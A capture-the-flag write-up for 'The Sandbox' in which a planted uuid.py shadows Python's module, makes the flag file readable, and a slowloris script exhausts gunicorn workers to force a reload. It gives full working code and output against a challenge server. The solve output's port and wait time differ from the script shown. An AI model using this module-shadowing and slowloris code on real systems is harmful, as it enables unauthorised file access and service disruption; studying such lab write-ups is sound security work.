# The Sandbox

## start docker
```
$ docker compose up -d --build
```
## list flag
Input
```
import os
print(os.listdir("/"))
```
Result
```
flag-19663a9db03a47f7f8e3f34c5ea81c1a.txt
```
## writeable
```
import os
for path in ["/app", "/app/runs", "/tmp", "/var/tmp", "/dev/shm"]:
    print(f"{path}: writable={os.access(path, os.W_OK)}")
```
Result
```
/app: writable=True
/app/runs: writable=False
/tmp: writable=True
/var/tmp: writable=True
/dev/shm: writable=True
```
`/app` is writeable
```
import os, stat
for f in os.listdir("/app"):
    p = "/app/"+f
    s = os.stat(p)
    print(stat.filemode(s.st_mode), s.st_uid, p, "W=", os.access(p, os.W_OK))
```
Result
```
drwxr-xr-x 0 /app/runs W= False
drwxr-xr-x 0 /app/__pycache__ W= False
-rw-r--r-- 0 /app/app.py W= False
```
we can't overwrite `app.py` as `nobody` user.
## fake uuid.py
Input
```python
src = '''import os
try:
    import glob
    for fp in glob.glob("/flag-*.txt"):
        os.chmod(fp, 0o644)
except Exception as e:
    open("/tmp/err","w").write(str(e))
    try: os.chmod("/tmp/err", 0o666)
    except: pass
import sys, importlib.util
_s = importlib.util.spec_from_file_location("uuid","/usr/local/lib/python3.14/uuid.py")
_m = importlib.util.module_from_spec(_s); _s.loader.exec_module(_m)
sys.modules["uuid"] = _m
uuid4 = _m.uuid4
'''
open("/app/uuid.py","w").write(src)
print("planted, len=", len(src))
```
Result
```
planted, len= 463
```
## check uuid.py
```
import os
print(os.popen("ls -l /app").read())
```
Result
```
total 16
drwxr-xr-x 2 root   root    4096 May  3 19:01 __pycache__
-rw-r--r-- 1 root   root    1983 May  3 09:22 app.py
drwxr-xr-x 1 root   root    4096 May  3 19:05 runs
-rw-r--r-- 1 nobody nogroup  463 May  3 19:03 uuid.py
```
## slowloris
from `Dockerfile` we have 8 gunicorn workers and default timeout is 30 seconds for each one.
we need to restart all of them so they use the fake `uuid.py` and make `/flag-<md5sum>.txt` readable.
```python
import time
import socket
import threading
from urllib.parse import urlparse

URL = "http://34.170.146.252:7503"
#URL = "http://127.0.0.1:3000"
parsed = urlparse(URL)
IP = parsed.hostname
PORT = parsed.port
NUM_CONNECTIONS = 8
TIMEOUT = 35


def hang_worker(worker_id):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(120)
        s.connect((IP, PORT))
        s.send(
            b"POST / HTTP/1.1\r\n"
            b"Host: " + IP.encode() + b"\r\n"
            b"Content-Type: application/x-www-form-urlencoded\r\n"
            b"Content-Length: 10000\r\n"
            b"\r\n"
        )
        for i in range(TIMEOUT):
            try:
                s.send(b"a")
            except Exception:
                break
            time.sleep(1)
        s.close()
    except Exception as e:
        # Don't silently swallow during debugging
        if worker_id < 3:
            print(f"[-] worker {worker_id}: {e}")


def force_reload():
    print(f"[*] Opening {NUM_CONNECTIONS} slow connections to {IP}:{PORT}...")
    threads = []
    for i in range(NUM_CONNECTIONS):
        t = threading.Thread(target=hang_worker, args=(i,))
        t.daemon = True
        t.start()
        threads.append(t)
    print(f"[*] Waiting {TIMEOUT}s for gunicorn timeouts to trigger...")
    time.sleep(TIMEOUT)
    print("[+] Reload window elapsed.")


if __name__ == "__main__":
    force_reload()
```
```
$ python slowloris.py
[*] Opening 8 slow connections to 34.170.146.252:7503...
[*] Waiting 35s for gunicorn timeouts to trigger...
[+] Reload window elapsed.
```
## read flag
Input
```
import glob
for f in glob.glob("/flag-*.txt"):
    print(open(f).read())
```
Result
```
Alpaca{REDACTED}
```
## solve

```python
import requests
import time
import socket
import threading
from urllib.parse import urlparse

#URL = "http://34.170.146.252:9252"
URL = "http://127.0.0.1:3000"

parsed = urlparse(URL)
IP = parsed.hostname
PORT = parsed.port
NUM_CONNECTIONS = 8


PAYLOAD = '''import os
try:
    import glob
    for fp in glob.glob("/flag-*.txt"):
        os.chmod(fp, 0o644)
    open("/tmp/marker","w").write("ok")
    os.chmod("/tmp/marker", 0o666)
except Exception as e:
    try:
        open("/tmp/err","w").write(str(e))
        os.chmod("/tmp/err", 0o666)
    except: pass
import sys, importlib.util
_s = importlib.util.spec_from_file_location("uuid","/usr/local/lib/python3.14/uuid.py")
_m = importlib.util.module_from_spec(_s); _s.loader.exec_module(_m)
sys.modules["uuid"] = _m
uuid4 = _m.uuid4
'''


def submit(code):
    """Submit code to the sandbox and return the rendered result page."""
    r = requests.post(URL + "/", data={"code": code}, timeout=15, allow_redirects=True)
    return r.text


def plant():
    print("[*] Planting uuid.py shadow...")
    code = f'''
src = {PAYLOAD!r}
open("/app/uuid.py","w").write(src)
print("planted len=", len(src))
'''
    body = submit(code)
    if "planted len=" in body:
        print("[+] Plant succeeded.")
        return True
    print("[-] Plant failed. Page snippet:")
    print(body[-500:])
    return False


def hang_worker(worker_id):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(120)
        s.connect((IP, PORT))
        s.send(
            b"POST / HTTP/1.1\r\n"
            b"Host: " + IP.encode() + b"\r\n"
            b"Content-Type: application/x-www-form-urlencoded\r\n"
            b"Content-Length: 10000\r\n"
            b"\r\n"
        )
        for i in range(50):
            try:
                s.send(b"a")
            except Exception:
                break
            time.sleep(1)
        s.close()
    except Exception as e:
        if worker_id < 3:
            print(f"[-] hang {worker_id} err: {e}")


def force_reload():
    print(f"[*] Opening {NUM_CONNECTIONS} slow connections to {IP}:{PORT}...")
    for i in range(NUM_CONNECTIONS):
        t = threading.Thread(target=hang_worker, args=(i,), daemon=True)
        t.start()
    print("[*] Waiting 35s for gunicorn worker timeouts to fire and respawn...")
    time.sleep(35)


def get_flag():
    print("[*] Reading flag via sandbox...")
    code = '''import glob
for f in glob.glob("/flag-*.txt"):
    try: print(f, "->", open(f).read())
    except Exception as e: print(f, "ERR", e)
'''
    body = submit(code)
    for line in body.split("\n"):
        if "Alpaca{" in line:
            print(f"\n[+] FLAG: {line.strip().replace("<pre>", "").replace("-&gt;", "->")}")
            return
    print("[-] No flag in response. Last 800 chars:")
    print(body[-800:])


if __name__ == "__main__":
    if not plant():
        raise SystemExit(1)
    force_reload()
    time.sleep(3)
    get_flag()
```

```
$ python solve.py
[*] Planting uuid.py shadow...
[+] Plant succeeded.
[*] Opening 8 slow connections to 34.170.146.252:18785...
[*] Waiting 55s for gunicorn worker timeouts to fire and respawn...
[*] Reading flag via sandbox...

[+] FLAG: /flag-19663a9db03a47f7f8e3f34c5ea81c1a.txt -> Alpaca{REDACTED}
```